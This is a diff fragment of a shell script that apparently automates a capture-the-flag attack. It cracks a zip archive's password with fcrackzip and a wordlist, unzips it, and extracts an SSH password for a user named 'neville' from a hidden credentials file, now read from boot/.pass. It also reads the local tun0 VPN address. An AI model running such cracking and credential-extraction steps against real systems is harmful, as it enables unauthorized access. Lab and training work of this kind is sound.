@@ -50,7 +50,7 @@ PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o 'PASSWORD FOUND!
 
 unzip -P $PASSWORD file.zip 
 
-ssh_pass=$(cat creds.txt | grep 'neville:' | cut -d ':' -f 2)
+ssh_pass=$(cat boot/.pass | grep 'neville:' | cut -d ':' -f 2)
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
